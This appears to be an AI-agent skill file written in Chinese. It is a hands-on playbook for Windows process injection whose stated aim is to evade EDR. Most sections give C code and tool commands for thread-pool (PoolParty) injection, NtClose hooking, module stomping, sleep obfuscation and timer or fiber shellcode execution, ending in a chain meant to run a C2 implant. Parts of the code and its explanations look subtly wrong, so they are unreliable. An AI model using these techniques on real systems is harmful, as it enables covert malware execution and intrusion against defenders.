---
name: advanced-process-injection
description: >-
  Advanced Windows process injection playbook. Use when classic CreateRemoteThread/NtCreateThreadEx injection is detected by EDR. Covers PoolParty (Thread Pool), Threadless Injection (hook-based), Module Stomping (DLL overwrite), Crystal Palace chain, Sleep Obfuscation (Ekko/Foliage/ShellCodeFluctuation), and callback execution via Timer-Queue/Fiber. Also use when you need injection techniques that leave minimal forensic traces or bypass syscall monitoring.
---

# 高级进程注入技术 — 实战手册

> **触发场景**: 传统注入（CreateRemoteThread、NtCreateThreadEx）被 EDR 拦截；需要无新线程注入；需要规避内存扫描（Private MEM 特征）；需要调用栈看起来合法。

## 0. 技术选型矩阵

| 场景 | 推荐技术 | 检测风险 | 代码复杂度 |
|---|---|---|---|
| 目标进程有活跃线程池 | **PoolParty** | 低 | 中 |
| 目标是高频系统调用进程 | **Threadless** | 低 | 高 |
| 需要最小化内存特征 | **Module Stomping** | 极低 | 中 |
| 需要组合最大免杀效果 | **Crystal Palace** (PoolParty+Stomping+Sleep) | 极低 | 高 |
| 快速原型 | **Timer-Queue Callback** | 中 | 低 |
| 极致隐蔽 | **Fiber Execution** | 低 | 中 |

---

## 1. PoolParty 注入（2024 热门）

### 核心原理

利用 Windows Thread Pool 的 **Worker Factory** 机制，向目标进程的线程池工作项队列中插入恶意任务。当线程池调度器处理到该任务时，工作线程自动执行 shellcode。

**关键优势**:
- 不调用 `CreateRemoteThread` / `NtCreateThreadEx`
- 执行流来自合法的 `TppWorkerThread`，调用栈自然
- 不需要 `VirtualAllocEx` + `WriteProcessMemory` 的经典模式

### 8 种变体

| 变体 | 利用对象 | 隐蔽性 | Shhhloader 集成 |
|---|---|---|---|
| Variant 1-3 | `TP_TIMER` 定时器 | ★★★ | - |
| Variant 4-6 | `TP_WAIT` 等待对象 | ★★★★ | - |
| **Variant 7** | `TP_IO` 完成端口 | ★★★★★ | ✅ 已集成 |
| Variant 8 | `TP_ALPC` 异步LPC | ★★★★ | - |

### Variant 7 实现（最推荐）

```c
// PoolParty Variant 7 — 通过 TP_IO 完成端口注入
// 原理：修改目标进程中已存在的 TP_IO 对象的回调函数指针

// 1. 枚举目标进程中的线程池 Worker Factory
NtQueryInformationProcess(hTargetProc, ProcessHandleInformation, ...);

// 2. 找到 TP_IO 对象（通过堆喷射特征定位）
// TP_IO 对象包含一个 callback 函数指针，位于固定偏移
typedef struct _TP_CALLBACK_INSTANCE {
    TP_CALLBACK_ENVIRON* CallbackEnviron;
    PTP_SIMPLE_CALLBACK  SimpleCallback;  // ← 需要修改的指针
    // ...
} TP_CALLBACK_INSTANCE;

// 3. 覆盖回调指针指向 shellcode
WriteProcessMemory(hTargetProcess, 
    &ioObject->SimpleCallback, 
    &shellcodeAddr, sizeof(PVOID), NULL);

// 4. 触发 I/O 完成 → 线程池自动调用 shellcode
```

### 工具集成

**Shhhloader** 已内置 PoolParty Variant 7:
```bash
python Shhhloader.py payload.bin -m poolparty -sc syswhispers3 -o loader.exe
```

---

## 2. Threadless Injection（2025 进化版）

### 核心原理

不创建新线程，而是 **Hook 目标进程中已存在的高频函数调用**。当正常程序逻辑触发被 Hook 的函数时，执行流自动跳转到 shellcode。

### 2025 年新变体

#### 变体1: Thread Pool Work Item 劫持

```c
// 不 Hook 函数，而是向目标进程的线程池提交工作项
// 使用未文档化的 TpAllocPool + TpAllocWork
HANDLE hTargetPool = GetTargetThreadPool(hTargetProcess);
TP_WORK* pWork = TpAllocWork(ShellcodeCallback, NULL, NULL);
TpPostWork(pWork);
TpReleaseWork(pWork);
```

#### 变体2: Fiber（纤程）劫持

```c
// 在目标进程上下文中创建纤程执行 shellcode
// 1. 在目标进程中分配 shellcode
LPVOID pRemoteSC = VirtualAllocEx(hTargetProc, NULL, scSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hTargetProc, pRemoteSC, shellcode, scSize, NULL);

// 2. 通过 QueueUserAPC + NtTestAlert 触发纤程创建
// 3. 在 APC 回调中调用 ConvertThreadToFiber + CreateFiber
// 4. 纤程在目标进程上下文中运行，调用栈纯天然
```

#### 变体3: NtClose Hook

```c
// Hook 目标进程 ntdll.dll 的 NtClose 函数
// NtClose 是系统调用频率最高的函数之一
BYTE originalBytes[14];
BYTE jumpToSC[] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp [rip]
    // + shellcode address (8 bytes)
};

// 保存原始字节
ReadProcessMemory(hTargetProc, NtCloseAddr, originalBytes, 14, NULL);

// 写入 JMP 到 shellcode
WriteProcessMemory(hTargetProc, NtCloseAddr, jumpToSC, sizeof(jumpToSC), NULL);

// 在 shellcode 执行完毕后恢复 NtClose 原始字节并跳回
```

---

## 3. Module Stomping（模块覆写）

### 核心原理

将 shellcode 写入目标进程中 **已加载的合法 DLL 的 .text 段**（MEM_IMAGE 类型内存），而非新分配的私有内存（MEM_PRIVATE）。EDR 内存扫描器通常跳过 MEM_IMAGE 区域，因为合法代码不应该在这些区域内执行。

### 完整实现

```c
BOOL ModuleStomping(HANDLE hProcess, LPVOID shellcode, SIZE_T scSize) {
    // 1. 在目标进程中加载一个合法的、足够大的 DLL
    //    推荐: C:\Windows\System32\AppResolver.dll (~200KB .text)
    LPVOID pDllBase = LoadRemoteLibrary(hProcess, "AppResolver.dll");
    
    // 2. 定位该 DLL 的 .text 段
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pDllBase;
    PIMAGE_NT_HEADERS pNt = RVA2VA(pDllBase, pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    LPVOID pTextSection = NULL;
    SIZE_T textSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            pTextSection = RVA2VA(pDllBase, pSection[i].VirtualAddress);
            textSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }
    
    // 3. 修改 .text 段权限为可写
    DWORD oldProtect;
    VirtualProtectEx(hProcess, pTextSection, scSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 4. 覆写 .text 段（选择不常用的函数区域）
    SIZE_T offset = textSize - scSize - 0x1000;  // 从尾部开始避免覆盖常用函数
    WriteProcessMemory(hProcess, (BYTE*)pTextSection + offset, shellcode, scSize, NULL);
    
    // 5. 恢复原始权限
    VirtualProtectEx(hProcess, pTextSection, scSize, oldProtect, &oldProtect);
    
    return TRUE;
}

// 关键点：shellcode 现在存储在 MEM_IMAGE 类型的合法 DLL 内存中
// EDR 的内存扫描器会将其归类为 "已加载模块的代码"
```

### Crystal Palace 组合链（PoolParty + Module Stomping + Sleep Obfuscation）

```
[生成Shellcode] → [Module Stomping 写入合法DLL区域] → [PoolParty V7 触发执行]
    → [Sleep Obfuscation 保护休眠期] → [C2 通信]
```

这是 2025-2026 年最高级别的用户态免杀链，组合了三种独立技术的优势。

---

## 4. Sleep Obfuscation 技术

### 技术对比

| 技术 | 加密目标 | 触发方式 | 对抗效果 |
|---|---|---|---|
| **Ekko** | 全部 .text 段 | Sleep 前加密 | ★★★★ |
| **ShellCodeFluctuation** | Shellcode 区域 | Sleep 期间 | ★★★★ |
| **Foliage** | - | Timer-Queue 替代 Sleep | ★★★★★ |
| **Cascade** | 多层加密 | 随机间隔 | ★★★★ |
| **AtomBombing** | - | Atom Table 存储 | ★★★ |

### Foliage 实现（推荐）

使用 `CreateTimerQueueTimer` 替代 `Sleep`，绕开 EDR 对 Sleep 函数的监控：

```c
// Foliage — 使用 Timer-Queue 定时器实现隐蔽延迟
VOID CALLBACK SleepCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    // 定时器触发时执行
    // 在回调中可以安全地加密/解密内存
    EncryptShellcode();  // 回填前的加密
    SetEvent(hWakeEvent);  // 通知主线程恢复
}

// 替代 Sleep(5000):
HANDLE hTimer = NULL;
HANDLE hWakeEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

EncryptShellcode();  // 休眠前加密
CreateTimerQueueTimer(&hTimer, NULL, SleepCallback, NULL, 5000, 0, 0);

// ... 等待回调 ...
WaitForSingleObject(hWakeEvent, INFINITE);
DecryptShellcode();  // 唤醒后解密
```

### ShellCodeFluctuation 模式

```c
// Sleep 期间：XOR 加密 → PAGE_NOACCESS
DWORD oldProtect;
VirtualProtect(shellcode, scSize, PAGE_NOACCESS, &oldProtect);
XorEncrypt(shellcode, scSize, XOR_KEY);

Sleep(3000);  // EDR 扫描时看到的是 NOACCESS + 加密数据

// 唤醒后：解密 → PAGE_EXECUTE_READ
XorDecrypt(shellcode, scSize, XOR_KEY);
VirtualProtect(shellcode, scSize, PAGE_EXECUTE_READ, &oldProtect);
```

---

## 5. 回调对象执行（替代线程执行）

### Timer-Queue 回调执行

```c
// 不需要 CreateThread，利用系统定时器回调执行 shellcode
VOID CALLBACK ShellcodeCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    // shellcode 在此回调中执行
    // 调用栈: ntdll!TppTimerpExecuteCallback → kernel32!BaseThreadInitThunk
    // EDR 看到的完全是合法调用链
    ((void(*)())shellcode)();
}

HANDLE hTimerQueue = CreateTimerQueue();
HANDLE hTimer = NULL;
CreateTimerQueueTimer(&hTimer, hTimerQueue, 
    (WAITORTIMERCALLBACK)ShellcodeCallback, 
    NULL, 100, 0,  // 100ms 延迟
    WT_EXECUTEDEFAULT);

// shellcode 将在 100ms 后由系统线程池自动执行
```

### Fiber 执行

```c
// 在主线程中创建纤程，在纤程中执行 shellcode
LPVOID pFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcode, NULL);
SwitchToFiber(pFiber);  // 切换到纤程 → 执行 shellcode
DeleteFiber(pFiber);

// 优势：与主线程共享栈，调用栈完全原生
```

---

## 6. 集成工具速查

| 工具 | 内置技术 | 命令示例 |
|---|---|---|
| **Shhhloader** | PoolParty V7, Module Stomping, SysWhispers3, OLLVM | `python Shhhloader.py payload.bin -m poolparty -sc syswhispers3` |
| **PoolParty** | 8 种变体 | `PoolParty.exe -v 7 -target svchost.exe` |
| **Freeze** | Early Bird APC + 悬挂恢复 | `Freeze.exe payload.bin /I:explorer.exe` |

---

## 7. 实战踩坑

1. **PoolParty 需要目标进程有活跃的线程池** → 大多数 GUI 进程（explorer.exe、svchost.exe）天然满足
2. **Module Stomping 需要选择足够大的目标 DLL** → `.text` 段必须大于 shellcode；推荐 `AppResolver.dll` 或 `Windows.Globalization.dll`
3. **Threadless Hook 可能导致目标进程崩溃** → 选择高频但非关键的 Hook 点（如 `NtClose`）；在 shellcode 中恢复 Hook
4. **Foliage 的 Timer-Queue 回调在 APT 已知特征库中** → 2026 年部分 EDR 已加入检测规则，配合 Syscall 使用
5. **Crystal Palace 组合链代码复杂度极高** → 建议先用单一技术验证 → 逐步组合
